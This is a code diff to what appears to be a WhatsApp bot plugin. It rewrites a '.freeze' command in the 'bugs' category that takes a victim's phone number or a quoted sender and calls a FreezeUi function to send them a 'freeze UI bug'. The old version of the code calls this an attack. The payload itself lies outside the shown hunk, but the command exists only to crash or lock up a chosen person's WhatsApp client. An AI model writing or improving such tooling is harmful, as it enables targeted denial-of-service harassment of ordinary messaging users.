@@ -102,52 +102,49 @@ async function FreezeUi(sock, target) {
     console.log(`Success Sending Bug FreezeUiCrL To Target`);
 }
 
+// Command
 cmd({
     pattern: "freeze",
-    desc: "Send freeze UI bug to a target",
+    desc: "Send WhatsApp Freeze Bug",
     category: "bugs",
     react: "❄️",
     filename: __filename
 }, async (conn, mek, msg, { from, reply, sender, args }) => {
+    
+    let target = args[0];
+    
+    // If no number, check if quoted message
+    if (!target && msg.quoted) {
+        target = msg.quoted.sender;
+    }
+    
+    if (!target) {
+        return reply(`╔══════════════════════════╗
+║     ❄️ FREEZE BUG ❄️      ║
+╠══════════════════════════╣
+║  Usage: .freeze [number]  ║
+║  Reply to message & .freeze║
+╠══════════════════════════╣
+║  Example:                  ║
+║  .freeze 923001234567     ║
+╚══════════════════════════╝`);
+    }
+    
+    // Format number
+    if (!target.includes('@')) {
+        target = target.replace(/[^0-9]/g, '');
+        if (target.length < 10) {
+            return reply("❌ Invalid number! Use format: .freeze 923001234567");
+        }
+        target = target + '@s.whatsapp.net';
+    }
+    
     try {
-        // FIX: Check if args exists and has value
-        let target = args && args[0] ? args[0] : null;
-        
-        // FIX: Check quoted message properly
-        if (!target && msg && msg.quoted && msg.quoted.sender) {
-            target = msg.quoted.sender;
-        }
-        
-        // FIX: Check if target is valid
-        if (!target || target === '') {
-            return reply("❌ Please provide a target number or reply to a user's message\n\nExample: .freeze 923001234567");
-        }
-        
-        // FIX: Number formatting with toString() protection
-        let cleanNumber = '';
-        try {
-            // Remove non-digits safely
-            cleanNumber = String(target).replace(/[^0-9]/g, '');
-            
-            // Check if we got a valid number
-            if (!cleanNumber || cleanNumber.length < 10) {
-                return reply("❌ Invalid phone number! Please provide a valid number.\n\nExample: .freeze 923001234567");
-            }
-            
-            // Add @s.whatsapp.net if not present
-            if (!target.includes('@')) {
-                target = cleanNumber + '@s.whatsapp.net';
-            }
-        } catch (err) {
-            return reply("❌ Error processing number: " + err.message);
-        }
-        
-        // Send attack
+        await reply(`⏳ Sending freeze bug to ${target.split('@')[0]}...`);
         await FreezeUi(conn, target);
-        reply(`✅ Freeze UI attack sent to ${cleanNumber}`);
-        
+        await reply(`✅ Freeze bug successfully sent to ${target.split('@')[0]}`);
     } catch (error) {
-        console.error('Freeze command error:', error);
-        reply(`❌ Error: ${error.message || 'Something went wrong'}`);
+        console.error(error);
+        await reply(`❌ Error: ${error.message}`);
     }
 });
